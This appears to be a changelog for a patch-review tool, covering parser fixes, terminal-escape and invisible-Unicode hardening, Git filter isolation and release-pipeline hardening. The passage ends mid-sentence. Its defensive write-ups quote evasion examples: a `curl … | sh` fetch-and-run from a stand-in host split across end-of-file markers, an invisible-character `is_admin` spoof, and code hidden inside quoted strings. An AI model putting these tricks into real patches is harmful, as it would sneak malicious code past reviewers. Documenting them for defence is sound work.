- **The long-line linearity test no longer fails on a busy host.** `graph`'s
  `the_import_rule_is_linear_on_long_lines` bounded its scans by 10 s of wall time; at load 56
  to 89 a linear scan using 1.8 s of CPU took over 10 s, failed the suite, and turned diff
  mutation results into false "caught" verdicts. It now bounds the scans' own thread CPU time
  (Linux `/proc/thread-self/schedstat`, wall time elsewhere) at 15 s, and keeps a 120 s
  wall-clock deadline only against hangs. Measured: linear code passes under 64 busy loops
  (20 s wall), and the quadratic import rule it guards against (`eee2b4c^`) still fails at 66.7 s
  of CPU time. Shrinking the lines was rejected: at 20,000 units the quadratic rule took 0.4 s.
- **Serde-built JSON no longer prints raw DEL or C1 controls** (bug hunt 2026-11-01). The
  `--hunks` and `--outline` views, `rpc`, MCP, the daemon socket and the review CLI are written
  by serde_json, which escapes only C0, and then passed through `core::json_line_safe`, which
  escaped only `U+2028`/`U+2029`; a patch path, `@@` heading or line holding the 8-bit CSI
  (`U+009B`) or OSC (`U+009D`) introducer reached the terminal raw, against SECURITY.md's DEL/C1
  promise. The pretty-printed documents (`findings verify`, `deploy doctor --json`, `eval --json`
  and `bench --json`) skipped `json_line_safe` altogether, so `findings verify` printed a
  finding's patch path, and `deploy doctor` its `--socket` path, with the raw CSI. `json_line_safe`
  now escapes `U+007F..=U+009F` too (the decoded document is unchanged), every pretty-printed
  document goes out through it, and the view pager and MCP's fit loop measure pages as escaped,
  so a page of C1 text still fits `max_bytes` (measured before: 14,255 bytes printed for an
  8,192-byte page).
- **Every Unicode default-ignorable code point is an `invisible` hazard and is escaped**
  (bug hunt 2026-11-01). `is_invisible` was a hand-picked list that missed the Mongolian free
  variation selectors `U+180B`-`U+180D` and `U+180F`, the Khmer inherent vowels `U+17B4`/`U+17B5`,
  `U+2065`, `U+206A`-`U+206F`, `U+FFF0`-`U+FFF8`, `U+1BCA0`-`U+1BCA3`, `U+1D173`-`U+1D17A` and the
  rest of `U+E0000`-`U+E0FFF`; `let ok = is_admin\u{180B};` (rustc accepts it as a distinct
  identifier) showed no hazard and printed exactly as `is_admin`. With `is_bidi` it now covers
  the whole `Default_Ignorable_Code_Point` set, so hazards, `display_safe` and untrusted-text
  sanitising all catch them.
- **`--layout inline` and `side-by-side` note a change their rows print as unchanged** (bug
  hunt 2026-11-01). Both layouts printed only each line's text, so a change to the end-of-file
  newline alone, a change between two non-UTF-8 bytes (both shown as `U+FFFD`), a trailing space,
  a no-break space against a space, a tab against the spaces it advances to (a broken Makefile)
  and, in side-by-side, a change past the column width (the cut hid it) looked unchanged. A `\`
  note row now follows a lossy line (`\ non-UTF-8 line, shown lossily`), a line without a final
  newline (`\ No newline at end of file`) and an added line whose printed text looks the same as
  its removed pair's (`\ differs from its pair only in bytes shown alike`, which also catches a
  literal `\x1b` against a raw `ESC`). Each layout judges the pair by what it prints: side-by-side
  by its cut, padded cells with a tab as four spaces, inline by raw tabs at 8-column terminal
  tab stops from the text's column. Letters that only look alike (Cyrillic `а` against Latin `a`)
  are not noted.
- **`InlineRow` and `SideCell` are `#[non_exhaustive]`** (review 2026-11-01). The entry above
  adds their `lossy` and `no_newline` fields, which already breaks a struct literal outside
  `deep-diff-forge-projection` (unpublished, and no workspace crate builds one); without the
  attribute every later flag would break it again. Read the fields and build rows with
  `inline_rows` and `side_rows`; a `compile_fail` doctest pins it.
- **The layouts' columns stay aligned past line 9999** (bug hunt 2026-11-01). The line-number
  fields were a fixed `{:>4}`, so rows at line 10000 and later pushed the side-by-side ` | `
  gutter and inline's marker column one place right. The fields are now as wide as the file's
  largest line number (at least 4).
- **A view cursor outside its selection is refused** (bug hunt 2026-11-01). `resume` checked a
  cursor's patch and selection but not its positions, so a forged or corrupted cursor past a
  hunk's end answered that hunk as `complete: true` with no lines, `remaining_hunks: 0` and no
  `next_cursor` (exit 0), one past the selection answered an empty page with nothing remaining,
  and `+0.05` was read as `0.5`. A position must now be canonical decimal and inside the selection
  (a hunk's line or a file's hunk, or `0`); anything else is `ViewError::Cursor` (CLI exit 2).
- **`PatchHunk::address` no longer claims to name exactly one hunk** (bug hunt 2026-11-01). Two
  byte-identical hunks at the same ranges in repeated sections of one path share an address, by
  design (views select every copy, findings resolve to the first); the rustdoc and README said
  otherwise. Documentation only: the hash is unchanged, so addresses stay stable.
- **A file whose section started past row 65,535 of the review could not be shown.** The diff
  pane scrolled through ratatui's `u16` paragraph offset, so selecting such a file drew another
  file's rows under its title and tree marker, no key could scroll past the cap, and `v` marked
  the unseen file reviewed (reproduced with a 70,000-line file before a one-line one). The pane,
  the file tree and the command panel now draw only their visible rows, unscrolled, from `usize`
  offsets; `ReviewApp::scroll` and `ReviewApp::panel_scroll` return `usize` (a breaking change
  for a caller that stores them as `u16`).
- **A key took 7.2 s on a 900,000-line patch.** Every frame built and syntax-painted a row for
  every line of every file, then showed about 20 of them, so each key, resize or mouse burst cost
  time and memory in proportion to the review. The diff pane now counts rows in one cheap walk
  and builds only the visible window, and the tree builds only its visible rows. Measured on the
  same patch: 12 to 24 ms per key and 197 MB, from 7.2 s and 1.3 GB. Wrapped rows of ASCII text
  are counted without being segmented; the first frame after `w` takes 0.18 s. Each frame still
  walks the whole review once to count its rows.
- **The default inline view dropped tab characters.** `display_safe` keeps a tab, and ratatui
  discards it as a control character, so tab indentation, and a dedent such as `return` moving
  out of an `if` in Python, looked unchanged; side-by-side and wrapped rows were right. Tabs are
  now expanded to four spaces before any untrusted text becomes a span (`safe_span`,
  `themed_spans`) and before the row's tint is measured. `projection` gains `expand_tabs` and
  `clip_cells`.
- **A mouse click on the file tree could select the wrong file.** The click mapper assumed a
  40-column, unscrolled tree: after the tree scrolled, a click selected the file that row would
  hold at the top (`f02.txt` for a click on `f23.txt`), on an 80-column terminal a click inside
  the diff changed the selection, and above 125 columns a click on the right of the tree focused
  the diff instead of selecting a file. The event loop now builds a `HitMap` of each frame it
  draws (the pane rectangles inside their borders and the tree's scroll; `HitMap::of`), and
  `map_mouse` resolves a click against it, so a click selects the row it lands on and a click on
  any border, the diff pane's included, or on the status bar does nothing (a breaking change to
  `map_mouse`'s signature; `SelectTreeRow` now carries a row of the whole tree). The map is kept
  by the loop, not the app: `render` only reads the `ReviewApp`, which stays `Send` and `Sync`.
- **Invisible format characters passed `display_safe` unescaped.** The invisible-character list
  missed assigned default-ignorable code points such as U+17B4 KHMER VOWEL INHERENT AQ, which
  Rust accepts inside an identifier: `let is_admin\u{17b4} = …` rendered like the removed
  `let is_admin = …`, with no hazard note. The Khmer inherent vowels, the Mongolian free
  variation selectors, the deprecated format characters U+206A to U+206F, the interlinear
  annotation controls, the shorthand format controls and the musical format controls are now
  escaped, reported as the `invisible` hazard, and dropped from untrusted annotation text.
- **A long or wide file name pushed a note's grounding label off the pane.** The note box
  measured its title and body in characters, not terminal cells, and never shortened the file
  name, so a CJK or 70-character name clipped `partially_grounded` and the box's corner. The box
  now measures in cells, clips the name with `…` so the label and corner fit, and wraps and pads
  its body by cell width.
- **Enter did nothing in the review view, though the README said it opens the file.** Enter now
  opens the selected file's diff: focus moves to the diff pane. It still runs the selected
  command in the palette.
- **A checked-out submodule's own filter no longer runs during working-tree acquisition.**
  `--ignore-submodules=none` (the H1-02 fix) made `git diff` run `git status` inside each
  submodule to see whether it was dirty, and that Git read the submodule's configuration
  (`.git/modules/<name>/config`, or the submodule's own `.git`) and `.gitattributes` and ran its
  clean filter: DDF turned off only the superproject's filters, so `--git-working-tree`, the
  daemon and MCP ran code from a repository someone handed you. Acquisition now passes
  `--ignore-submodules=dirty`: the commit each submodule records is still compared whatever
  `diff.ignoreSubmodules` or `.gitmodules` say, and Git never runs inside a submodule. A
  submodule's uncommitted changes, which the superproject never stores, are no longer marked
  `-dirty`.
- **A `\ No newline at end of file` marker must end its side of the file.** The marker drops the
  newline of the line before it, so Git joins the next line of that side onto it: `+cu`, a
  marker, `+rl -fsSL https://e.example/x | s`, a marker, `+h` was reviewed as three harmless
  added lines (rank 2) while `git apply` wrote one `curl … | sh` line (rank 5, `network_fetch`).
  A later line of a side a marker ended, in the same hunk or a later hunk of the file, now
  refuses the patch with `InvalidEofMarker` at the marker (exit 4). Git's own forms (a marker
  after the old side's last line, then the new side's lines) still parse.
- **CRLF patch headers name the paths Git applies.** The parser split lines on LF only, so a
  header kept its carriage return: `--- /dev/null\r` was not `/dev/null`, and an added
  `.github/workflows/ci.yml` was reviewed as `modified .github/workflows/ci.yml\r` (rank 5
  instead of 8, with its `new_file`, `ci_privilege` and `config_or_lockfile` signals lost); a
  CRLF mode line was refused as an invalid mode. As `git apply` does, the carriage returns ending
  a header line (`---`, `+++`, extended headers, hunk headers) are now dropped. Body lines keep
  theirs (content), and a CR inside a quoted name (`"x\r"`) is still part of the path and still
  `control`.
- **Header paths lose their first component, as `git apply -p1` strips it.** Only a literal
  `a/` or `b/` was stripped, so `--- vendor/build.rs` was reviewed as vendored code (rank 5, no
  `build_hook`) while Git wrote the top-level `build.rs` (rank 9), a `diff.mnemonicPrefix` diff
  was reviewed as `w/build.rs`, and `diff -ru old/ new/` output kept `new/`. The first component
  is now stripped whatever it is (a path with no `/` is kept whole).
- **`rename old`/`rename new` headers are refused.** `git apply` reads them as `rename from`/
  `rename to`; DDF ignored them, so the rename was reviewed as `modified <new>` with no sign that
  the old path is removed. No current Git writes them, so they now refuse the patch with
  `UnsupportedFormat` (exit 4) rather than being translated. A `diff --git a/x b/y` with no
  rename header at all is still reviewed as `modified y` (open: the direct two-file comparison
  depends on it, and the model has no old-path field).
- **A `diff --git` line is split where both halves name one path, before the ` b/` guess.** The
  rightmost ` b/` was tried first, so `diff --git a/x b/y b/x b/y` with a mode change was
  reviewed as `mode_changed y` while `git apply` changed `x b/y`, and the mnemonic
  `diff --git i/a b/c w/a b/c` as `c` instead of `a b/c`; `i/x "w/x"` got an empty path. The line
  is now split as `git_header_name` splits it, for any prefixes and a quoted second half, and
  the rightmost ` b/` is used only when the halves name different files (the mode change of two
  files compared with `git diff --no-index`).
  A name split this way that holds a NUL is refused with `InvalidPath`, as a NUL in any other
  header name is: kept, it rendered as a quoted `\000` that the parser refused (fuzz, PR #83).
- **A file section that names no path is refused.** A `diff --git i/x w/y` (or CRLF `i/x w/x`)
  mode change with no `---`/`+++` was reviewed as a file with an empty path (exit 0); Git
  refuses it ("lacks filename information"), as it refuses a hunk with no file headers, which
  DDF also reviewed with an empty path. Such a section now refuses the patch with `InvalidPath`
  at its first line (exit 4).
- **Repeated slashes in a header path are squashed, as Git squashes them.**
  `--- a/.github//workflows/ci.yml` was reviewed as `.github//workflows/ci.yml` (no
  `ci_privilege`) while Git wrote `.github/workflows/ci.yml`; the same held for `---`/`+++` in a
  Git diff and for `rename from`/`rename to`.
- **A traditional diff keeps the old name when it prefixes the new one.** `--- a/build.rs` with
  `+++ b/build.rs.new` was reviewed as `modified build.rs.new` (no `build_hook`) while
  `git apply` changed `build.rs`: without `diff --git`, Git prefers the shorter name when the old
  name is a strict prefix of an unquoted new one. The parser now chooses as Git does.
- **An epoch timestamp creates or deletes the file in a traditional diff.**
  `--- a/new.sh<TAB>1970-01-01 00:00:00.000000000 +0000` (the `diff -N` form) was reviewed as
  `modified new.sh`, losing `new_file`, while Git created the file; an epoch on the `+++` side
  deletes the file the `+++` names. The parser now reads the epoch in any zone, as
  `has_epoch_timestamp` does (not with a fraction other than zero, a CRLF line end, or in a Git
  diff, where Git does not either).
- **`-p0` is guessed from the patch, as `git apply` guesses it.** After a traditional diff whose
  new name has no `/` (`--- x`/`+++ x`), Git keeps every later path whole, so a later
  `.github/workflows/ci.yml` was reviewed as `workflows/ci.yml`, losing `ci_privilege`. The
  parser now makes the same guess and holds it for the rest of the patch.
- **A traditional header name ends where Git's does.** A `diff -u` date after spaces
  (`--- a/build.rs 2026-01-01 12:00:00`) stayed in the path (`build.rs 2026-01-01 12:00:00`,
  no `build_hook`), an unquoted CR inside a `---`/`+++` name stayed in it while Git wrote the
  name before it, and `/dev/null` followed by a space was a path rather than a creation. Names
  are now read as `find_name_traditional` reads them: a trailing date after a tab or spaces
  ends the name, otherwise a tab or CR does.

### Security

- **CodeQL is a required check** (2026-11-02). Ruleset 25868121 now requires `codeql (rust)` and
  `codeql (actions)` as well, thirteen checks in all, after 14 consecutive passing runs of 4 to
  5 minutes. Before this, a failed or cancelled CodeQL run did not block a merge.
- **A filter in a repository's `config.worktree` no longer runs during Git acquisition.**
  Acquisition turned off only the filters `git config --local` lists, which does not read
  `$GIT_DIR/config.worktree` (used once `extensions.worktreeConfig` is set), so a filter defined
  there ran and its output was reviewed in place of the file. Acquisition now lists every scope
  with `--show-scope` and turns off each filter any unprotected scope defines (local, worktree,
  their includes, and any scope it does not know). Filters from the user's global and system
  configuration, such as Git LFS, stay on by decision (SECURITY.md); a test with planted global
  and system files proves that nothing else they name (fsmonitor, external diff, textconv, a
  diff driver command, set directly or through `include.path`/`includeIf`) runs.
- **A repository filter whose name is not UTF-8 refuses the acquisition.** The name was
  decoded lossily (`\xff` became U+FFFD) before DDF named it to Git, and Git matches a subsection
  name byte for byte, so the override named another filter and the repository's own ran. Passing
  the raw bytes fixed it on Linux, but the macOS CI job measured the filter still running: macOS
  Git's `--get-regexp ^filter\.` did not match a key that is not UTF-8, so the filter was never
  listed. Acquisition now lists every key (`git config --list`) and picks the `filter.` keys
  itself, and any such name refuses the acquisition on every platform (`InvalidSelection`).
- **The caller's `GIT_CONFIG_COUNT`/`KEY`/`VALUE` configuration is kept.** DDF numbered its
  filter overrides from 0 and set the count, which replaced the caller's own entries (all of them
  when the repository defined no filter). They are now numbered after the caller's count (from
  `GitAcquireOptions::env`, else inherited); a count Git reads but DDF does not (a leading
  space) is refused as `InvalidSelection`.
- **Every release binary is run before it ships.** The x86_64 macOS binary was cross-built and
  only checksummed; the release smoke now runs it under Rosetta 2 (installed if missing) after
  checking it is x86_64. A test fails if any release target is built without being run.
- **The crates.io job fails closed.** With the owner's gate open (`DDF_CRATES_IO=open`) and no
  `CARGO_REGISTRY_TOKEN`, it used to exit 0 without publishing; it now fails. It runs in a
  `release` environment that only `v*` tags can deploy to.
- **Release tags are immutable.** A tag ruleset (`refs/tags/v*`: no deletion, no update, no
  non-fast-forward, no bypass) stops a published tag being moved to other code.
- **Code scanning.** `codeql.yml` runs CodeQL (security-extended) over the Rust code and the
  workflows on pull requests, pushes to `main` and weekly. Not a required check yet.
- **Pinned actions are enforced.** `cli/tests/workflow_pins.rs` fails when any `uses:` in any
  workflow is not a local path or a full 40-hex commit SHA.

### Tests

- **The gate sandbox's surviving mutants are closed** (`review/src/sandbox.rs`): tests pin `--cpus=<host CPUs − 1, min 1>` in argv and receipt, refuse a blank runtime or an empty image by name, and bound control-command output at 64 KiB; one `>=` deadline mutant is argued equivalent (EVIDENCE.md).
- **`mutation_scope`'s quadratic-scan guard fails instead of hanging.** Its 1 MiB `#` run is
  scanned under a 30 s deadline, so the test binary exits and eager `#` counting, which
  `code_lines_skip_comments_and_attributes_across_lines` already fails, is reported as caught,
  not as a timeout (EVIDENCE.md, "Review crate: mutation_scope mutation").
- **Council admission boundaries are pinned:** nine `review` contract tests kill the 16 `policy.rs`/`model.rs` mutants that survived the whole-crate run (EVIDENCE.md).
- **The Python `StdioClient` timeout covers the request write.** `_exchange` wrote the request
  with a blocking `write` and `flush`, and only the read had a deadline: a request larger than
  the pipe buffer (64 KiB; any real patch) sent to a child that had stopped reading blocked
  forever, and the child was never killed (measured: `timeout=1.0`, a 1 MiB patch, `sleep 30` as
  the child, killed by an outer 8 s `timeout`). Both pipes are now non-blocking and one selector
  writes the request in chunks and reads the answer under one deadline; on expiry the child is
  killed and `TransportError` raised (measured: after 1.0 s). A child that answers and closes
  before taking the whole request is read, not reported as "not reading".
- **Learning store: an append never glues a receipt onto an unterminated last line.**
  `append_receipt` wrote at the end without checking the last byte. After a torn write, or a hand
  edit that dropped the final newline (which `load_receipts` accepts), the next `learn record`
  exited 0 but merged its receipt into that line: every later `learn status` failed with exit 3
  (`trailing characters`), and deleting the bad line also lost the new receipt. The append now
  writes a newline first when the store does not end in one, so the new receipt is its own line
  and a torn fragment stays a separate, visible corrupt line.
- **The Python client maps every invalid answer to `TransportError` and kills the child.** An
  answer that was not UTF-8 or not JSON escaped `_Client.call` as a raw `UnicodeDecodeError` or
  `JSONDecodeError` (both transports) and left the stdio child running; an answer for another
  request id did not kill it either. They now raise `TransportError("not a valid response: …")`
  as the Rust SDK does, and `StdioClient` kills the child. A finding holding a lone surrogate,
  which `json.loads` accepts but UTF-8 cannot carry, raised a bare `UnicodeEncodeError` for the
  whole `verify_findings` batch; it now raises `ValueError` naming the finding's index before
  anything is sent (the CLI, reading JSONL bytes, refuses such a line as `malformed`; one request
  cannot carry it at all).
- **A stored receipt may hold only receipt fields (anchor A-05).** `load_receipts` parsed each
  line with serde's default, which drops unknown keys, so a hand-edited line carrying a `path` or
  `source` key was counted and scored, against the documented promise that a line holding a path
  is refused, naming its line. A stored line with a key that is not a receipt field is now
  refused (`receipt store line N: invalid receipt: a stored receipt holds a key that is not a
  receipt field`, exit 3); the key is not echoed, since it may be the path. `learn record --stdin`
  still drops extra keys, as the privacy probe requires: they are never written.
- **A relative `XDG_STATE_HOME` or `XDG_RUNTIME_DIR` is ignored.** `resolve_learning_dir`
  accepted any non-empty value, so `XDG_STATE_HOME=relstate` put the learning store under the
  working directory, often the repository under review. The XDG Base Directory spec makes a
  relative value invalid: the resolver now falls back to `$HOME/.local/state`, and a relative
  `$HOME` gives `NoStateDir`. The daemon's `runtime_base_from` had the same gap for its socket;
  a relative `XDG_RUNTIME_DIR` now fails closed like an unset one (`daemon path` exits 2).
- **`doctor` names the state directory the learning store uses.** It formatted `$XDG_STATE_HOME`
  as is, so after the resolver began ignoring a relative value, `XDG_STATE_HOME=relstate
  deep-diff-forge doctor` printed `state_dir=relstate/deep-diff-forge`, a place nothing writes
  to, while `learn record` wrote under `$HOME/.local/state`. `state_dir` is now the parent of the
  store's own resolved directory (the daemon socket and runtime dir already used the daemon's
  resolvers), and with no absolute `$XDG_STATE_HOME` or `$HOME` it prints `<unset: …>`.
- **A deeply nested answer is a `TransportError` too, and the stdio child is killed.** An answer
  of about 200 KB of `[` made `json.loads` raise `RecursionError`, which `_Client.call` did not
  map, so it escaped raw on both transports and left the `StdioClient` child running (measured).
  It is now `TransportError("not a valid response: …")` like any other invalid answer.
- **`StdioClient` returns an early answer from a child that stops reading but stays alive.** The
  exchange kept waiting to write the rest of the request until the deadline, though the whole
  answer was already read: a child that refused a 1 MiB request and then slept gave
  `TransportError: no answer within 2 s` instead of its refusal (measured). A complete answer line
  now ends the exchange. Its unsent tail would garble the next request, so the out-of-step child
  is killed and the next call raises `TransportError`.
- **A path and a line resolve in every section with the path.** `findings verify` searched only
  the first file section with a finding's path, so in a concatenated patch that names one file
  twice, a line in the later section was refused as `line_outside_hunk` although its address
  form was accepted. `resolve`, the cockpit's `annotations` (which fell back to a file note) and
  `validate_anchor` (which refused a later section's hunk or span) now search every section with
  the path, in review order; a path without a line still anchors to the first.
- **A relative run directory no longer lets the candidate shrink the sealed mutation scope.**
  `council prepare <request> run` with a `mutation_base` handed Git the snapshot as relative
  `run/source/<path>` lines on `hash-object --stdin-paths`, and Git runs inside the reviewed
  repository, so it hashed `<repository>/run/source/<path>` instead of the sealed copy. With
  nothing there, prepare failed (exit 4, `Git acquisition command failed`); with an ignored copy
  planted there holding a changed file's base bytes, the file matched its base blob and was left
  out of `mutation.diff` and its sealed `mutation_diff_sha256` (measured: a changed `y.rs` dropped,
  and with every changed file planted, an empty diff). `prepare` now names the run absolutely
  (its canonical parent joined with its name) before anything is written.
- **`council import-tuicr --execute` no longer writes a journal its own reader refuses.** Appends
  checked only that the journal length was unchanged, never the 64 MiB cap `load_journal`
  enforces, so imports of large comments (measured: three 22 MiB ones) took `decisions.jsonl` to
  69,208,645 bytes, after which every import of the run, dry runs included, was refused until the
  append-only journal was edited by hand. The planned events are now encoded and refused before
  anything is written when they would pass the cap, in a dry run as in an execute (exit 4,
  `tuicr import refused (journal): ... would pass its 67108864-byte cap; nothing was appended`).
  A journal already over the cap is reported as a journal refusal, not as `tuicr export refused
  (run): artifact exceeds acquisition budget`.

- **The pre-push secret hook no longer lets a force push over an unfetched remote tip through
  unscanned.** For an existing branch it scanned `<remote tip>..<local>`; when the remote tip was
  not in the local clone (a `--force` push after someone else updated the branch), git could not
  resolve the range, gitleaks 8.30.1 logged the error, reported "0 commits scanned, no leaks
  found" and exited 0, and a committed token reached the remote (measured). The hook now scans
  `<local> --not --remotes=<remote>` whenever the remote tip is not a local commit, and refuses
  the push if `git rev-list` cannot resolve the range, so gitleaks' exit status is never the only
  signal.
- **`scripts/diff_mutation.sh` no longer passes untested when a changed Rust file's name has a
  space or a non-ASCII byte.** It detected Rust changes by matching `+++ b/crates/….rs` header
  text, but git appends a TAB to a header path with a space and C-quotes one with a non-ASCII
  byte (`core.quotePath`), so a change touching only such files printed "no Rust changes" and
  exited 0 in all four required shards (measured). Changed files now come from `git diff
  --name-only -z`, and the diff handed to cargo mutants is written with `core.quotePath=false`:
  cargo mutants 27.1.0 refuses a quoted header outright (measured, exit 6).
- **`scripts/diff_mutation.sh` gives the same answer from any directory.** Its `-- crates/`
  pathspec resolved against the current directory, so from a subdirectory the diff was empty and
  the gate passed with no mutants tested (measured). It now runs at the repository root; a
  relative `DDF_MUTATION_OUT` stays relative to the caller.
- **The release no longer compiles third-party code while holding write and OIDC tokens.** The
  `build` matrix held `contents: write`, `attestations: write` and `id-token: write` (on dry runs
  too) while `cargo build` ran every dependency's build scripts and proc macros, which could have
  minted an OIDC token for the release workflow's identity (inferred from GitHub's documented
  OIDC behaviour). `build` is now `contents: read` and keeps its archives as workflow artifacts; a
  new tag-only `release` job, which checks out and runs no project code, re-verifies the
  checksums, attests and uploads. `cli/tests/release_workflow.rs` refuses an elevated job that
  compiles.
- **A failed release platform no longer leaves a published, partial GitHub Release.** Each
  matrix leg (`fail-fast: false`) uploaded its own assets to a non-draft release, so the legs
  that passed published while a failed one only turned the run red (traced, not run). The one
  upload now happens in the `release` job, which needs every `build` leg; crates.io `publish`
  now needs `release`.
- **`scripts/fuzz_target.sh` fuzzes a fresh private corpus.** It reused a fixed
  `/tmp/ddf-<target>-corpus` with `mkdir -p`, so another local user could pre-create it with
  symlinks the seed copy wrote through (a planted `basic.patch` link overwrote its target with the
  fixture, measured), and inputs from earlier runs stayed in the corpus. The corpus is now a new
  `mktemp -d` directory (mode 0700) removed after the run; crashes stay in `fuzz/artifacts/`.
  Its root (`DDF_FUZZ_CORPUS_ROOT`, else `RUNNER_TEMP`, else `/tmp`) is still made when missing,
  as `mkdir -p` did, so a root that does not exist yet does not fail the run (measured).
- **`scripts/fuzz_target.sh --list` lists every `[[bin]]`, however it is laid out.** A line
  match took only a `name = "…"` on the line right after `[[bin]]`, so a valid table with `path`
  first or `name="x"` dropped out of the CI smoke and the weekly campaign while still compiling
  (measured). The list now comes from Python's `tomllib`.
- **`just ci` runs on the toolchain CI pins.** `scripts/ci_local.sh` ran every step but the MSRV
  check on the floating rustup default while `ci.yml` pins 1.99.1, so after a `rustup update` a
  local PASS could differ from CI (inferred). It now exports `RUSTUP_TOOLCHAIN=1.99.1`, exits 2
  if that toolchain, rustfmt or clippy is missing, and `ci_replica.rs` fails when its pin and
  `ci.yml`'s disagree.

### Documentation

- **Production readiness rescored at `main` `1eaba47`** (2026-11-02): self-assessment 91, Codex's
  independent rescore 89, reconciled 89 (`docs/PRODUCTION_READINESS.md`). The three bugs the
  bug hunt deferred are now listed in the repository too, as known limitations; they were
  recorded only in the maintainers' vault. `EVIDENCE.md` records the merges of #82 to #84.
- **The docs match `main` and say what is shipped, planned, withdrawn or on hold** (2026-11-01).
  Each design and planning doc opens with a dated status block naming the module behind what
  ships. Corrected: the Python install line (`@v0.5.0` has no `pyproject.toml`; it now names
  `@main`), the README's required-check table (it omitted `bench`), `<old> <new>` described as
  refused (VISION, gap analysis), `rank`, `annotate`, `render` and the extra cluster lanes
  listed as planned (they are withdrawn), the daemon sizing that assumed one request at a time,
  the dependency and fuzz-target lists, and the eval corpus size. Recorded the owner decisions
  of 2026-11-01: the `release` environment needs the owner's approval and deploys only from
  `v*` tags; secret scanning has push protection and provider patterns, gitleaks stands in for
  the non-provider patterns and validity checks GitHub does not offer this repository; the
  launchd agent on a physical Mac is on hold, an open item in ROADMAP and CONTRIBUTING.

## [0.5.0] - 2026-10-31

### Added

- **`deep-diff-forge bench [--quick] [--workload NAME]... [--json]`** times seven workloads on
  generated inputs and prints `deep-diff-forge.bench.v0`. That receipt carries the profile, the
  host, each input's SHA-256, and the min, median, p95 and KiB/s.
  - `scripts/bench_compare.py` compares receipts from one machine (best median per side; over
    25% and over 0.2 ms slower fails). A workload whose input changed is reported as not
    compared, and a malformed receipt exits 2.
  - A `bench` job on every pull request runs the merge base against the head (a required check from
    0.5.0, see Changed), and the weekly campaign keeps a full receipt.
- **`deep-diff-forge eval [--corpus DIR] [--json]`** scores ranking pairs, evidence precision
  and recall, and findings verdicts against `fixtures/eval/MANIFEST.json`, a hashed and labelled
  corpus of 11 cases with documented known misses. It prints `deep-diff-forge.eval.v0`.
  `cli/tests/eval.rs` holds the floors.

- **Daemon metrics.** `deep-diff-forge daemon metrics` (the daemon's `daemon.metrics`, protocol
  2) returns `deep-diff-forge.daemon-metrics.v0`:
  - per method that was called: requests, errors by RPC code, and latency as log₂ microsecond
    buckets with p50, p95 and p99 upper bounds;
  - admission: admitted, waited, wait time, busy refusals, and peak in-flight bytes and requests;
  - connections: accepted, refused at the limit, refused as another user, and errors;
  - engine: contained panics, session-table resets, and sessions opened, closed and evicted.

  Recording takes no lock (relaxed atomics). `deploy doctor` warns, with the counts, when a live
  daemon reports contained panics, busy refusals or session resets.
- **`daemon start --log-format json`:** one JSON object per log line (`ts_ms`, `level`, `event`,
  `message`). The default text line is unchanged.

- **Verified agent findings.** `deep-diff-forge findings verify --findings FILE [--require-all]`
  checks agent findings (JSONL, `deep-diff-forge.finding.v0`) against the patch on stdin.
  - It checks the hunk address or path and line, freshness (`review` against `input_sha256`),
    size, and duplicates. It prints the sealed `deep-diff-forge.findings.v0` verdict, with
    `claim_verified: false` always.
  - Accepted findings are normalised from the review (the line's own kind and text) and sanitised.
  - Refused ones carry one reason: `malformed`, `stale_review`, `unknown_path`,
    `unknown_address`, `line_outside_hunk`, `duplicate` or `too_long`.
  - The same verdict comes from the daemon's `findings.verify`, `rpc`, the MCP tool
    `verify_findings` and the Python SDK's `verify_findings`.
  - `review --findings FILE` shows the accepted findings in the cockpit as agent notes, never
    grounded, and a finding cannot pass for the engine's own notes.

- An address-anchored finding is resolved through a table of hunk addresses built once per
  call. Before (in this change's own first version), each finding hashed every hunk again: 2,000
  findings against 400 hunks took 3,560 ms. Now 33 ms (measured with `deep-diff-forge bench`,
  release build).

- A `findings_verify` fuzz target: every non-blank line gets exactly one verdict, every accepted
  anchor resolves, and no sanitised text keeps an unsafe character.

- **Code evidence in risk ranking.** Nine lexical signals are read from the changed lines
  themselves: `unsafe_added`, `process_spawn`, `network_fetch`, `dynamic_eval`, `ci_privilege`,
  `build_hook`, `secret_like`, `check_suppressed` and `test_removed`. They cover Rust, Python,
  JS/TS, Go, shell (with `Dockerfile` and `Makefile`) and YAML, and a shebang names the language
  of a file with no extension.
  - Comments and strings are blanked, with block comments and triple-quoted strings followed across
    a hunk's lines.
  - Each signal adds its weight once per file, and a path cannot hide it: token evidence keeps its
    weight under `generated/` or `vendor/`.
  - `rank.v0` lists each file's `evidence` (signal, hunk address, side, line, `basis: lexical`; at
    most 32). Outline and hunk heads list their labels. The daemon, `rpc`, MCP and the cockpit
    (one note per item, on its hunk) show the same.
  - Before, a hunk adding `unsafe { std::process::Command::new("curl") }` to `src/lib.rs` scored
    the same 7 as any `lib.rs` edit. Now it scores 15, with both signals at line 2.

- An `evidence_scan` fuzz target checks, for any patch, that every evidence item names its own
  hunk and a line inside it, and that the outline labels and the rank agree.

- The plan behind this and the next changes: `docs/PLAN_AGENT_EVIDENCE_AND_OBSERVABILITY.md`.

### Changed

- The pull-request `bench` comparison (`bench (base vs head)`, renamed from
  `bench (base vs head, informational)`) is a required check: ruleset 25868121 now requires
  eleven. A head over 25% and over 0.2 ms slower than its merge base on any workload blocks the
  merge.

- **Daemon protocol 2.** `findings.verify` is `since: 2`; clients that ask for protocol 0 or 1
  get the method lists they had.

- `deep-diff-forge-daemon` and `deep-diff-forge-cli` depend on `deep-diff-forge-agent`
  (`docs/crate-edges.txt`).

- CLI daemon tests wait up to 10 s, not 2 s, for a daemon to start or exit, so a loaded machine
  is not read as a failure. Two local gate runs had failed once each and did not reproduce in
  15 later full runs; a 2 s wait under a parallel build is the likely cause (inferred, not
  reproduced).

- **Breaking (graph crate):** `RankedFile` is `#[non_exhaustive]` and gains `evidence` and
  `evidence_truncated`. Build it with `RankedFile::scored(file)`, the one constructor, so score,
  signals and evidence always come from one assessment (`assess_file`). `RiskSignal` gains
  `Code(EvidenceSignal)`. `sort_ranked` is the one ranking order, and the cluster crate uses it.

### Fixed

- Code evidence is linear in the number of matching lines. Each new item was checked against
  every item already found, so one file of 160k lines that each add `unsafe` took 4.8 s (and
  the 64 MiB patch budget allowed far more); it takes 0.15 s. A changed line now yields each
  signal once by construction, however many rules or tokens match it.

### Security

- **Quoting code no longer hides it from code evidence** (DDF-EVID-001). The lexical view
  blanked everything between quotes, so `V="$(curl …)"` in shell,
  `` `${require("child_process").execSync(c)}` `` in JS and `f"{eval(x)}"` in Python carried no
  evidence. Code inside `$(…)`, `${…}` and backticks (shell double quotes), `${…}` (JS template
  literals) and `{…}` (one-line Python f- and t-strings, not `{{`; `\{` still runs) is now
